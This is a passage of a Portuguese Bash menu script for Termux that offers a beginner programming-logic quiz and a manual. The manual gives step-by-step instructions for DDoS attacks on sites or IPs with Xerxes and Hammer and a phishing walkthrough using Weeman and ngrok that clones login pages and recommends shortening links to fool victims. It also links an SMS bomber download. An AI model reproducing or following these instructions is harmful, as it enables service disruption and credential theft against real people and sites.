     l\033[0m \033[1;32m4\033[0m \033[1;36m-\033[0m \033[1;31mComentário em pseudocodigo \033[0m\033[1;36m    l
     l\033[0m \033[1;32m5\033[0m \033[1;36m-\033[0m\033[1;31m Como aprender algoritmo  \033[0m\033[1;36m      l
     l\033[0m \033[1;32m6\033[0m\033[1;36m -\033[0m\033[1;31m Regras pra nomear uma variável \033[0m\033[1;36ml
     l \033[0m\033[1;32m7\033[0m\033[1;36m - \033[0m\033[1;31mOq é lógica\033[0m\033[1;36m		          l
     l\033[0m\033[1;32m 8\033[0m\033[1;36m -\033[0m\033[1;31m Comando de atribuição\033[0m\033[1;36m          l
     l\033[0m\033[1;32m 9\033[0m\033[1;36m -\033[0m\033[1;31m Não tenho dúvidas		  \033[1;36ml
     \------------------------------------/\033[0m

\033[1;31mDigite um dos números acima para saber sobre:\033[0m'
			read RESP_DO_MENU_DE_TIRAR_DUVIDAS;clear
		     case "$RESP_DO_MENU_DE_TIRAR_DUVIDAS" in
			1)
			 #Algoritmo
				echo -e '\033[1;33mALGORITMO:\033[0m\033[1;34m é como se fosse uma receita de bolo, um passo a passo.
Todo algoritmo deve ser bem feito e bem explicado sem que o usuario tenha dúvidas ao ler o mesmo....Vale destacar aqui que um algoritmo é essencial para quem quer criar um programa porém da para nós fazermos pequenos programas sem fazer um algoritmo, porém isso só quando vc tem muita experiência! \033[0m
'
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
				read SEGUE;;
			2)
			 #Tipos de algoritmos
				echo -e "\033[1;34mOs algormos mais famosos para aprender lógica de programação é:

•Pseudocodigo(Portugol);
•Diagrama de blocos;
•Descrição narrativa; 
\033[0m"
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
                                read SEGUE;;
			3)
			 #Oq é uma variavel
				echo -e "\033[1;34mVariável é um espaço no programa que serve para armazenar dados, Por exemplo o computador ele não entede informação ele entede dados pois ele é muito burro. \033[0m

\033[1;33mPERGUNTAS FREQUENTES:
1) Qual a diferença entre dados e informação?

R= \033[0m\033[1;34mAlgo não compreendido por exemplo se um gringo vem falar com você, Você não vai enteder nada isso é dados. Ou seja algo não compreendido. Agora, informação é o dado compreendido. \033[0m
"
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
                                read SEGUE;;
			4)
			 #Comentario em pseudocodigo
			 	echo -e '\033[1;34mSimples, Basta colocar "//". vale destacar aqui que o comentário no codigo não altera em nada a execução do programa. Tipo vai ficar ali sem nenhuma função só a de deixar o código explicado. \033[0m
'
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
                                read SEGUE;;
			5)
			 #Como aprender algoritmo
				echo -e '\033[1;34mPraticando e apreendendo com os erros.\033[0m
'
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
                                read SEGUE;;
			6)
			 #Como nomear uma variavel
				echo -e '\033[1;34mPara se declarar ou nomear uma variável... existem regras e caso você quebre qualquer uma delas, o Seu programa não irá funcionar!

As regras são as seguintes (Pelo que eu me lembre RS):

•Não pode ser uma palavra reservada do sistema;
•Não pode começar com números;
•Não pode  conter caracteres(Incluindo especiais);
•Não pode conter espaços em branco no nome de uma variável  (No máximo um underline ex: numero_Para_Somar1); \033[0m
'
				echo -e '\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m'
                                read SEGUE;;
			7)
			 #Oq é logica
				echo -e '
\033[1;36m=-=-=-=-=-=-=-=
= \033[0m\033[1;33mOQ É LÓGICA\033[0m\033[1;36m =
=-=-=-=-=-=-=-=\033[0m

\033[1;34mBom, lógica é tipo isso: se João quer saber se ana é vaidosa então ele deve olhar pra onde ? \033[0m

\033[1;33mRESPONDA:\033[0m

\033[1;32m1\033[0m \033[1;36m-\033[0m \033[1;34mRoupa\033[0m
\033[1;32m2\033[0m \033[1;36m-\033[0m \033[1;34munha, unha do pé, lábios e orelhas \033[0m'
				read AULA21_RESP7;clear
				if [[ $AULA21_RESP7 -eq 1 ]];then
					echo -e "\033[1;34mPequeno gafanhoto, você errou pois você pode está bem vestido por questão de uniforme tipo por causa que é um casamento ou imagine se a pessoa é rica? então se você tivesse respondido 2 vc estava certo e praticamente usou sua lógica pois a lógica segundo o wiki é frequentemente dividida em três partes: o raciocínio indutivo, o raciocínio abdutivo e o raciocínio dedutivo. Então se vc tivesse acertado vc teria usado o raciocínio dedutivo. \033[0m"
				else
					if [[ $AULA21_RESP7 -eq 2 ]];then
						echo -e "\033[1;34mVocê acertou, Então com base nisso nós podemos dizer que você usou a lógica para responder essa pergunta.Pois segundo o wiki A lógica é frequentemente dividida em três partes: o raciocínio indutivo, o raciocínio abdutivo e o raciocínio dedutivo. E vc usou o seu raciocínio dedutivo. \033[0m"
					fi
				fi
				echo -e '
\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m '
				read SEGUE;clear
				unset AULA21_RESP7
				echo -e '
\033[1;36m=-=-=-=-=-=-=-=
= \033[0m\033[1;33mOQ É LÓGICA\033[0m\033[1;36m =
=-=-=-=-=-=-=-=\033[0m

\033[1;34mMas afinal oq é logica? Bom, A lógica é uma parte da filosofia que estuda o fundamento, a estrutura e as expressões humanas do conhecimento. Enfim é importante destacar que a lógica está ligada a filosofia e matemática....

Também é importante destacar que o criador da lógica foi Aristóteles.
\033[0m'
				echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
				read SEGUE;;
			8)
			 #Comando de atribuicao em portugol
				echo -e '\033[1;34mO comando de atribuição em Portugol é:

<-

Pois esse comando vai tá atribuindo um valor a determinada variável, Vale destacar que o comando de atribuição varia de linguagem pra linguagem.

Logo abaixo um algoritmo usando esse programa:
\033[0m
\033[1;33m[1] CÓDIGO \033[0m
\033[1;32m
algoritmo "EXEMPLO"
var a,b:inteiro
a <- 5
b <- 3
escreval ("A resposta é: ",a+b)
Fimalgoritmo 
\033[0m\033[1;33m
[2] RESULTADO:\033[0m\033[1;34m

A resposta é: 8\033[0m
'
				echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                                read SEGUE;;
                        9)
			 #Usuario n tem duvidas
				echo -e '
\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
      \033[1;31mÓtimo! Já que vc n tem dúvidas
      Então a aula acabou por hoje \033[0m
'
				echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
				read SEGUE
	           esac
                done;;
	   22)
              #AVAL FINAL
		ANIMA_DA_AVA
		echo -e "\033[1;34m
Chegamos a avaliação final do seu curso de introdução a lógica de programação em Portugol, Então serão 5 perguntas sendo cada uma valendo 2 pontos.

Após você apertar enter a prova irá começar:

Boa sorte ! \033[0m
"
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR: \033[0m"
		read SEGUE
		clear
		echo -e "\033[1;33mESCOLHA AS OPÇÕES CERTAS LOGO ABAIXO: \033[0m"
		sleep 4
		echo
		echo -e "\033[1;31m1) Oq e é informação? \033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;34mÉ o dado não recebido\033[0m

\033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;34mÉ o dado compreendido, e dado é a informação não compreendida.\033[0m

\033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;34mÉ o dado compreendido e os computadores entendem informação e também processam dado \033[0m

\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read AVAL_FINAL_RESP1
		clear


		#Verificando se acertou a resposta
		if [ "$AVAL_FINAL_RESP1" -eq 2 ];then
		   AVAL_FINAL_RESP1_OFC="sim"
		else
		   AVAL_FINAL_RESP1_OFC="não"
		fi



		echo -e "\033[1;31m2) Os computadores eles processam ? \033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;34mDado pois computadores não processam informação e se entendesse informação talvez seria o fim da raça humana \033[0m

\033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;34mInformação pois dado é a informação não compreendida \033[0m

\033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;34mDados do tipo inteiro e real\033[0m

\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read AVAL_FINAL_RESP2
		clear




		#Verificando se acertou a resposta
		if [ "$AVAL_FINAL_RESP2" -eq 1 ];then
		   AVAL_FINAL_RESP2_OFC="sim"
		else
		   AVAL_FINAL_RESP2_OFC="não"
		fi


		echo -e '\033[1;31m3)Observe o programa abaixo:\033[0m
\033[1;32m
algoritmo "Verdadeiro ou falso"
escreval (-1-1=1)
Fimalgoritmo
\033[0m
\033[1;31mEsse programa vai imprimir qual mensagem na tela? \033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;34mFalso\033[0m

\033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;34mVerdadeiro\033[0m

\033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;34mVerdadeiro e falso\033[0m

\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m '
		read AVAL_FINAL_RESP3
		clear


		#Verificando se acertou a resposta
		if [ "$AVAL_FINAL_RESP3" -eq 1 ];then
		   AVAL_FINAL_RESP3_OFC="sim"
		else
		   AVAL_FINAL_RESP3_OFC="não"
		fi


		echo -e "\033[1;31m4)Qual o comando de atribuição em Portugol?\033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;34m<>\033[0m

\033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;34m<< \033[0m

\033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;34m<-\033[0m

\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read AVAL_FINAL_RESP4
		clear



		#Verificando se acertou a resposta
		if [ "$AVAL_FINAL_RESP4" -eq 3 ];then
		   AVAL_FINAL_RESP4_OFC="sim"
		else
		   AVAL_FINAL_RESP4_OFC="não"
		fi



		echo -e '\033[1;31m5)Qual o comando para ler o valor de uma variável do tipo caracter, Sendo o nome da variável "EMPRESA": \033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;34mleia (enpresa) \033[0m

\033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;34mleia (empresa)\033[0m

\033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;34mleia (EMPRESA)\033[0m

\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m'
		read AVAL_FINAL_RESP5
		clear



		#Verificando se acertou a resposta
		if [ "$AVAL_FINAL_RESP5" -eq 3 ];then
		   AVAL_FINAL_RESP5_OFC="sim"
		else
		   AVAL_FINAL_RESP5_OFC="não"
		fi



		#CALCULANDO A NOTA FINAL
		if  [ "$AVAL_FINAL_RESP1_OFC" = "sim" ];then
		     NOTA_FINAL_DO_CURSO=$((NOTA_FINAL_DO_CURSO+2))
		fi

		if  [ "$AVAL_FINAL_RESP2_OFC" = "sim" ];then
		     NOTA_FINAL_DO_CURSO=$((NOTA_FINAL_DO_CURSO+2))
		fi

		if  [ "$AVAL_FINAL_RESP3_OFC" = "sim" ];then
		     NOTA_FINAL_DO_CURSO=$((NOTA_FINAL_DO_CURSO+2))
		fi

		if  [ "$AVAL_FINAL_RESP4_OFC" = "sim" ];then
		     NOTA_FINAL_DO_CURSO=$((NOTA_FINAL_DO_CURSO+2))
		fi

		if  [ "$AVAL_FINAL_RESP5_OFC" = "sim" ];then
		     NOTA_FINAL_DO_CURSO=$((NOTA_FINAL_DO_CURSO+2))
		fi
		#FIM

		#Instalando o figlet para imprimir a nota final
		pkg install figlet;clear
		#fim

		echo -e "\033[1;33mNOTA FINAL: \033[0m"
		echo -e "\033[1;31m"
		figlet $NOTA_FINAL_DO_CURSO
		echo -e "\033[0m
                 \033[1;36m=-=-=-=-=-=-=
                 =\033[0m\033[1;33m RESULTADO\033[0m\033[1;36m =
                 =-=-=-=-=-=-=\033[0m

\033[1;34mVOCÊ ACERTOU A PRIMEIRA QUESTÃO ?\033[0m\033[1;31m $AVAL_FINAL_RESP1_OFC \033[0m

\033[1;34mVOCÊ ACERTOU A SEGUNDA QUESTÃO ?\033[0m\033[1;31m $AVAL_FINAL_RESP2_OFC \033[0m

\033[1;34mVOCÊ ACERTOU A TERCEIRA QUESTÃO ?\033[0m\033[1;31m $AVAL_FINAL_RESP3_OFC
\033[0m
\033[1;34mVOCÊ ACERTOU A QUARTA QUESTÃO ?\033[0m\033[1;31m $AVAL_FINAL_RESP4_OFC
\033[0m
\033[1;34mVOCÊ ACERTOU A QUINTA QUESTÃO ?\033[0m\033[1;31m $AVAL_FINAL_RESP5_OFC
\033[0m"
		echo -e '
             \033[1;36m =-=-=-=-=-=-=-=-=-=-=-=
              =\033[0m\033[1;33m RESPOSTAS CORRETAS:\033[0m\033[1;36m =
              =-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;34m1) Oq e é informação?
R=\033[0m \033[1;31mÉ o dado compreendido \033[0m

\033[1;34m2) Os computadores eles processam ?
R= \033[0m\033[1;31mDado, Pois se fosse informação talvez seria o fim da raça humana..\033[0m

\033[1;34m3) Observe o programa abaixo:

algoritmo "Verdadeiro ou falso"
escreval (-1-1=1)
Fimalgoritmo

Esse programa vai imprimir qual mensagem na tela?

R=\033[0m\033[1;31m Falsa
\033[0m
\033[1;34m4) Qual o comando de atribuição em Portugol?
R=\033[0m\033[1;31m <-\033[0m

\033[1;34m5) Qual o comando para ler o valor de uma variável do tipo caracter, Sendo o nome da variável "EMPRESA":
R=\033[0m \033[1;31mleia (EMPRESA)\033[0m
'



		#Verificando se o aluno foi aprovado ou n
		if [ "$NOTA_FINAL_DO_CURSO" -ge 6 ];then
			ALUNO_AP_OU_RP="APROVADO"
		else
			ALUNO_AP_OU_RP="REPROVADO"
		fi


		echo -e "\033[1;32mSENDO A NOTA MÍNIMA PARA SER APROVADO 6, VC FOI: $ALUNO_AP_OU_RP \033[0m
"
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE;;
          esac
   done;;
    25)
     #Op do menu principal de ver manual
         echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33m MANUAL DA SCRIPT:\033[0m \033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m


\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m1) SOBRE O DESENVOLVIMENTO:\033[0m

\033[1;34mA HeleSCript foi desenvolvida pelo helexiel em agosto de 2019, E lançada em setembro de 2019. Ele obteve ajuda de alguns parceiros do hacking mas nada de mais, já que ele que programou tudo.

Helexiel Obteve apoio da team de hacking Umbrella Corporation, Cujo dono é o Levi. Inclusive ele kodou a script para essa team. \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m





\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m2) PRA QUE SERVE A SCRIPT:\033[0m
\033[1;34m
•Personlizar o termux;
•Se defender de travas(Upar código pelo termux);
•Baixar e instalar coisas;
•Em uma opção da script, Oferece aulas/turoriais de hacking, e também um curso; \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m





\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m3) INSTALEI O XEXES, E AGORA COMO EU FAÇO O ATAQUE DDOS?\033[0m

\033[1;34mSegue as instruções abaixo:\033[0m

\033[1;32m[1] Abra uma nova aba no termux e digite:\033[0m
\033[1;34mcd XERXES\033[0m
\033[1;32m[2] dando permissão para o arquivo.\033[0m
\033[1;34mchmod +x *;ls\033[0m
\033[1;32m[3]\033[0m
\033[1;34mclang xerxes.c -o xerxes\033[0m
\033[1;32m[4]Fazendo o ataque\033[0m
\033[1;34m./xerxes (site) 80\033[0m

\033[1;32mObs:\033[0m \033[1;34mCaso queira parar o ataque, Aperte no botão "ctrl" na barra ... e em seguida na letra "c", do teclado. \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m






\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m4) COMO FAZER ATAQUE DDOS PELO HAMMER?\033[0m

\033[1;34mPrimeiro instale o python2 no menu principal. E logicamente instale o hammer.....E logo em seguida abra uma nova aba no termux e digite:\033[0m

\033[1;32m[1] Entrando na pasta\033[0m
\033[1;34mcd hammer\033[0m

\033[1;32m[2] Dando permissões pra script\033[0m
\033[1;34mchmod +x *
ls\033[0m

\033[1;32m[3] Comando para executar o ataque ddos/dos.\033[0m
\033[1;34mpython hammer.py -s [ip] -p 80 -t 135
\033[0m
\033[1;32mAluno - Como parar o ataque ?\033[0m

\033[1;34mAperte no botão "ctrl" e em seguida na letra "c" do teclado. Vale destacar que o "ctrl" está na barra do termux.

caso o ctrl não esteja aparecendo, Isso significa que ele está ocultado. Então para fazer o mesmo aparecer aperte no botão de diminuir volume (-) e em seguida na letra "k".    \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m






\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m5) COMO EU FAÇO PISHING PELO WEEMAN?\033[0m

\033[1;32m1) O QUE É PISHING:\033[0m

\033[1;34mBom, antes de tudo eu gostaria de falar sobre oq é pishing, Pishing é o invasor fazer um site fake simulando ser o verdadeiro de login. Sendo assim... o invasor manda para a vítima o site fake e usa alguma engenharia social/Mentira para fazer com que a mesma entre no site. Como 'Entre aqui e ganhe'...

Enfim, Oq eu quero dizer é que quando a vítima colocar o seu login e senha, O invasor vai ver isso no seu terminal, Ou o login e senha vai ser enviado pro gmail do invasor.
\033[0m
\033[1;32m2) PRINCIPAIS PARTES DO PROCESSO:\033[0m

\033[1;34mEu (Helexiel) dividir os principais passos em duas partes, Que são:

•REDE INTERNA;
•REDE EXTERNA;
\033[0m
\033[1;32m3) QUAL A DIFERENÇA ENTRE REDE INTERNA E REDE EXTERNA:\033[0m
\033[1;34m
Rede interna é só quem está na sua rede wi-fi, Ou seja o link do site fake, Só vai funcionar pra quem está na sua rede wi-fi.

Já em rede externa é o contrário, O link vai funcionar até pra quem estiver em outro estado. Como por exemplo: Se depare com a situação, vc está no acre e quer enviar o link pra uma pessoa de Brasília... Como o link é em rede externa o recebente vai conseguir acessar o link.
\033[0m
\033[1;32m4) PASSO A PASSO PARA FAZER O LINK EM REDE INTERNA:\033[0m
\033[1;34m
Primeiro instale/Baixe o git no menu principal, Escolhendo a opção 10.

Escolha a opção de atualizar os repositórios, Baixe também o python2, curl e o Perl.

E por fim.... instale o weeman no menu principal, digitando a opção 7.

Logo após isso, Abra uma outra aba no  termux, e digite esses comandos abaixo:
\033[0m
\033[1;32m[1] entrando na pasta do weeman \033[0m
\033[1;34mcd weeman
\033[0m
\033[1;32m[2] Executando a script \033[0m
\033[1;34mpython2 weeman.py  \033[0m

\033[1;32m[3] logo após executar vai aparecer uma coisa vermelha\033[0m
\033[1;34mset url LINK_DO_SITE_Q_DESEJA_CLONAR
\033[0m
\033[1;32m[4]\033[0m
\033[1;34mset action_url LINK_DO_SITE_Q_DESEJA_CLONAR
\033[0m
\033[1;32m[5]\033[0m
\033[1;34mrun


Após ter digitado "run", Vai surgir um link, e esse link é do site fake. E vale destacar aqui que esse link não vai funcionar em rede externa.

Para fixar o conteúdo desse título, Eu recomendo vc copiar e colar esse link no navegador, e em seguida digitar qualquer coisa na parte de login e senha. E depois voltar ao termux e oq vc digitou irá aparecer na aba do weeman.
\033[0m
\033[1;32m5) PASSO A PASSO PARA FAZER O LINK EM REDE EXTERNA:\033[0m

\033[1;32mObs:\033[0m \033[1;34mPara serguir esse tutorial vc tem que fazer o link em rede interna, E não ter fechado as abas.
\033[0m
\033[1;32m5.1) entre no site do ngrok e crie uma conta, Para obter o "Token":\033[0m

\033[1;34mO link do site do ngrok é https://ngrok.com/ 

Vale destacar que a sua conta por ser gratuita, Irá ficar disponível só por 15 dias.

Enfim, Logo após ter feito a sua conta, copie tudo da opção 3 Aonde começa com "Token".
\033[0m
\033[1;32m5.2) BAIXANDO O PS.NGROK NO MENU PRINCIPAL:\033[0m
\033[1;34m
Logo após ter copiado o Token... abra a aba aonde está sendo executado a script HELESCRIPT e escolha a opção 9.
\033[0m
\033[1;32m5.3) CRIANDO O LINK PARA REDE EXTERNA:\033[0m
\033[1;34m
Abra uma nova aba no termux, e digite 
\033[0m
\033[1;32m[1]\033[0m
\033[1;34m./ngrok\033[0m
\033[1;32m[2] Copiando e colando o seu token \033[0m
\033[1;34m./ngrok TOKEN\033[0m
\033[1;32m[3] Criando o link \033[0m
\033[1;34m./ngrok http 8080

Logo após isso espere aquela parte aonde tá "offline", Ficar "online". E o link será criado...  o link certo é o que tá com https!

Vale destacar aqui que o certo é você encurtar o URL, Pois se n assim vai ficar muito suspeito, Vc mandar o site que o ngrok gerou pra sua vítima.

Eu aconselho esse site pra encurtar os seus sites fake abaixo, Pois vc pode personalizar pra ficar parecido com o real:

https://is.gd/                        \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m









\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m6) PRA QUE SERVE O WGET ?\033[0m

\033[1;34mSeve pra baixar coisas por link.\033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m






\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m7) COMO UTILIZAR O WGET ?\033[0m

\033[1;34mSimples, É só seguir as instruções abaixo:

wget -c (url)
\033[0m
\033[1;32mExemplo:\033[0m
\033[1;34m
wget -c https://www.dropbox.com/s/wqn0q1agkm77umz/SMS%20Bomber_0.95.zip

\033[0m
\033[1;32mObs:\033[0m \033[1;34mCaso queira baixar, e ao mesmo tempo meio que mover pra uma determinada pasta é esse comando abaixo:

wget -c (url) (caminho)    \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m






\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m8) O QUE SÃO O FIGLET, CMATRIX E COWSAY ?\033[0m
\033[1;34m
São apenas animações. Caso esteja curioso ... instale o cmatrix no menu principal da script.

E em seguida abra uma nova aba no termux e digite "cmatrix".

Ou então instale o cowsay, Abra uma nova aba no termux e digite:

"cowsay Ola Humano"   \033[0m
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m




\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
\033[1;33m9) COMO BUGAR AS TRAVAS DO WHATS ?\033[0m
\033[1;34mBugar travas do whats, É tipo fazer com que todas as mensagens que te enviem venham bugadas e logicamente as travas ctt e texto vai cair bugadas.

Basicamente é só apagar o arquivo: "/data/data/com.whatsapp/databases/axolotl.db", Depois é só fechar a janela do whats... caso a mesma esteja aberta, Que o código irá upar.

Ou seja oq essa script vai fazer é apagar o arquivo que eu citei anteriormente.


Obs: Isso só funciona com root. \033[0m

\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m
'
echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
read SEGUE;;
    26)
     #Op do menu principal de creditos
  	 echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33m OPÇÃO DE CRÉDITOS \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;32mDESENVOLVEDOR(PROGRAMADOR):\033[0m
     \033[1;34mDr_Hele_Strange(Helexiel).\033[0m
\033[1;32mAJUDANTES:\033[0m
    \033[1;34m Levi.\033[0m
\033[1;32mSALVES:\033[0m
     \033[1;34mBinHitler, Crybaby, Gabriel Flooder e General Bet4.\033[0m
\033[1;32mTEAM APOIADORA:\033[0m
     \033[1;34mUmbrella Corporation.\033[0m"
	 echo
	 echo -e "\033[1;33mAPERTE ENTER PARA VOLTAR AO MENU PRINCIPAL:\033[0m"
 	 read SEGUE;;
    27)
     #Op do menup de sair
	 echo -e '
\033[1;36m
 ____            _   _           _              _ _       
| __ ) _   _ _  | | | |_ __ ___ | |__  _ __ ___| | | __ _ 
|  _ \| | | (_) | | | | `_ ` _ \| `_ \| `__/ _ \ | |/ _` |
| |_) | |_| |_  | |_| | | | | | | |_) | | |  __/ | | (_| |
|____/ \__, (_)  \___/|_| |_| |_|_.__/|_|  \___|_|_|\__,_|
       |___/  \033[0m';;
esac
#Acima o fim do caso do menup
#Fim do enquanto
done
